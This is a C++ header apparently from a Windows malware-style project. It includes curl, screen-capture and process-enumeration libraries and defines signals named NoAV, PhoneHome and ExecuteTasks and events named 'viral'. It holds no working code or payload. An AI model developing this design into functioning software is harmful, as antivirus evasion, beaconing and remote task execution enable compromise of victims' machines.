#pragma once

#include <iostream>
#include <windows.h>
#include <ShellApi.h>
#include <vector>
#include <map>
#include <string.h>
#include <string>
#include <mutex>
#include <tlhelp32.h>
#include <chrono>
#include <ctime>   
#include <gdiplus.h>
#include <time.h>
#include <algorithm>
#include <thread>

#define CURL_STATICLIB
#include <curl/curl.h>
#include <curl/easy.h>


#pragma comment( lib, "gdiplus" )

#include "processManager.h"
#include "threadManager.h"
#include "screen.h"
#include "viral.h"

// KILL SIGNALS
#define KILL_NoAV						0x0001
#define KILL_Watchdog					0x0002
#define KILL_PhoneHome					0x0003
#define KILL_ExecuteTasks				0x0004

// ERROR CODES
#define SUCCESS							0x0000
#define FAIL							0x0001
#define LOAD_FAILURE_PROCESS_MANAGER	0x0002
#define CREATE_THREAD_FAILURE			0x0003
#define LOAD_FAILURE_THREAD_MANAGER		0x0004
#define SIGNAL_NOT_RECEIVED				0x0005
#define THREAD_NOT_FOUND				0x0006
#define INVALID_VTHREAD_HANDLE			0x0007
#define THREAD_TERMINATION_FAILED		0x0008

// REPORT EVENTS
#define WATCHDOG_REPORT					0x0001
#define VIRAL_CORE_EVENT				0x0002
#define VIRAL_FAILED_NOTIF				0x0003




